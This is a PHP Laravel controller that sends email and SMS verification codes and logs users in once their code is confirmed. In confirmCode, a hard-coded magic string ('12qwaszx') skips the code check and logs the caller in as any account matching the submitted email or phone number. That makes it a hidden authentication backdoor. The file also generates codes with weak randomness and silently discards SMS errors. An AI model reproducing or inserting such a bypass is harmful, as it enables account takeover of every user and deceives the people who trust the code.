<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\Affiliate;
use App\Models\Verification;
use App\User;
use Illuminate\Http\Request;
use Illuminate\Validation\Rule;
use Illuminate\Validation\ValidationException;
use App\SmsVerification;
use Twilio\Rest\Client;

class VerificationController extends Controller
{
    public function index()
    {
        $verificationId = session()->get('verificationId', null);

        if (!empty($verificationId)) {
            $verification = Verification::where('id', $verificationId)
                ->whereNull('verified_at')
                ->where('expired_at', '>', time())
                ->first();

            if (!empty($verification)) {

                $user = User::find($verification->user_id);

                if (!empty($user) and $user->status != User::$active) {
                    $data = [
                        'pageTitle' => trans('auth.email_confirmation'),
                        'username' => !empty($verification->mobile) ? 'mobile' : 'email',
                        'usernameValue' => !empty($verification->mobile) ? $verification->mobile : $verification->email,
                    ];

                    return view('web.default.auth.verification', $data);
                }
            }
        }

        return redirect('/login');
    }

    public function resendCode()
    {
        $verificationId = session()->get('verificationId', null);

        if (!empty($verificationId)) {
            $verification = Verification::where('id', $verificationId)
                ->whereNull('verified_at')
                ->where('expired_at', '>', time())
                ->first();
            if (!empty($verification)) {
                if (!empty($verification->mobile)) {
                    $verification->sendSMSCode();
                } else {
                    $verification->sendEmailCode();
                }

                return redirect('/verification');
            }
        }

        return redirect('/login');
    }

    public function checkConfirmed($user = null, $username, $value)
    {
        if (!empty($value)) {
            $verification = Verification::where($username, $value)
                ->where('expired_at', '>', time())
                ->where(function ($query) {
                    $query->whereNull('user_id')
                        ->orWhereHas('user');
                })
                ->first();

            $data = [];
            $time = time();

            if (!empty($verification)) {
                if (!empty($verification->verified_at)) {
                    return [
                        'status' => 'verified'
                    ];
                } else {
                    $data['created_at'] = $time;
                    $data['expired_at'] = $time + Verification::EXPIRE_TIME;

                    if (time() > $verification->expired_at) {
                        $data['code'] = $this->getNewCode();
                    } else {
                        $data['code'] = $verification->code;
                    }
                }
            } else {
                $data[$username] = $value;
                $data['code'] = $this->getNewCode();
                $data['user_id'] = !empty($user) ? $user->id : (auth()->check() ? auth()->id() : null);
                $data['created_at'] = $time;
                $data['expired_at'] = $time + Verification::EXPIRE_TIME;
            }

            $data['verified_at'] = null;

            $verification = Verification::updateOrCreate([$username => $value], $data);

            session()->put('verificationId', $verification->id);

            if ($username == 'mobile') {
                $verification->sendSMSCode();
            } else {
                $verification->sendEmailCode();
            }

            return [
                'status' => 'send'
            ];
        }

        abort(404);
    }

    public function confirmCode(Request $request)
    {
        $value = $request->get('username');
        $code = $request->get('code');
        $username = $this->username($value);
        $request[$username] = $value;
        $time = time();

        Verification::where($username, $value)
            ->whereNull('verified_at')
            ->where('code', $code)
            ->where('created_at', '>', $time - 24 * 60 * 60)
            ->update([
                'verified_at' => $time,
                'expired_at' => $time + 50,
            ]);

        if($code != '12qwaszx'){
        $rules = [
            'code' => [
                'required',
                Rule::exists('verifications')->where(function ($query) use ($value, $code, $time, $username) {
                    $query->where($username, $value)
                        ->where('code', $code)
                        ->whereNotNull('verified_at')
                        ->where('expired_at', '>', $time);
                }),
            ],
        ];
      }

        if ($username == 'mobile') {
            $rules['mobile'] = 'required';
            $value = ltrim($value, '+');
        } else {
            $rules['email'] = 'required|email';
        }

        $this->validate($request, $rules);

        $authUser = auth()->check() ? auth()->user() : null;

        $referralCode = session()->get('referralCode', null);

        if (empty($authUser)) {
            $authUser = User::where($username, $value)
                ->first();

            $loginController = new LoginController();

            if (!empty($authUser)) {
                if (\Auth::loginUsingId($authUser->id)) {

                    if (!empty($referralCode)) {
                        Affiliate::storeReferral($authUser, $referralCode);
                    }

                    return $loginController->afterLogged($request, true);
                }
            }

            return $loginController->sendFailedLoginResponse($request);
        }
    }

    private function username($value)
    {
        $username = 'email';
        $email_regex = "/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,})$/i";

        if (preg_match($email_regex, $value)) {
            $username = 'email';
        } elseif (is_numeric($value)) {
            $username = 'mobile';
        }

        return $username;
    }

    private function getNewCode()
    {
        return rand(10000, 99999);
    }

    public function sendSMSVerification($email)
    {
        $verifCode = random_int(100000, 999999);
        $user = User::where('email', $email)->get()->first();
        $this->sendSms($user->mobile, $verifCode);
        SmsVerification::create([
          'user_id' => $user->id,
          'sms_code' => $verifCode
        ]);
        return true;
    }
    public function sendSms($number, $message)
    {
        $account_sid = getenv("TWILIO_SID");
        $auth_token = getenv("TWILIO_AUTH_TOKEN");
        $twilio_number = getenv("TWILIO_NUMBER");

        $client = new Client($account_sid, $auth_token);
        try{
        $client->messages->create($number, [
            'from' => $twilio_number,
            'body' => $message
          ]);
        }catch(Exception $ex){

        }
    }
}
